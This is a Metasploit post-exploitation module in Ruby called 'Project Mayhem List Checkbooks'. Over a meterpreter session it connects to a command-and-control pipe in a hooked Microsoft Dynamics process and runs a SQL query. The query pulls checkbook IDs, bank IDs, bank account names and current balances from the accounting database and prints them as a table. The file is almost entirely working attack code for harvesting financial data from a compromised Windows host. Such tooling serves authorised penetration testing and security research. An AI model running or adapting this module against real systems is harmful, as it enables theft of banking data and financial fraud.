##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/project_mayhem'
require 'rex/ui/text/table'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::ProjectMayhem

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Project Mayhem List Checkbooks',
			'Description'    => %q{
				List Checkbooks through a hooked Dynamics process.
			},
			'Author'        => 'Spencer McIntyre',
			'License'       => MSF_LICENSE,
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end


	def run
		connect
		print_good("Opened a handle to the C&C pipe")

		begin
			result = execute_query("SELECT CHEKBKID, DSCRIPTN, BANKID, CURNCYID, BNKACTNM, str(CURRBLNC, 19, 5) AS CURRBLNC FROM TWO.dbo.CM00100")
		rescue RuntimeError => ex
			print_error(ex.message)
			result = nil
		else
			print_good("Command completed successfully!")
		ensure
			disconnect
		end
		return if result == nil

		checkbook_table = Rex::Ui::Text::Table.new(
			'Header' => 'Check Books',
			'Indent' => 2,
			'Columns'=> result['names'],
			'SortIndex' => -1
		)

		result['values'].each do |row|
			checkbook_table << row
		end

		print_line(checkbook_table.to_s)
	end
end
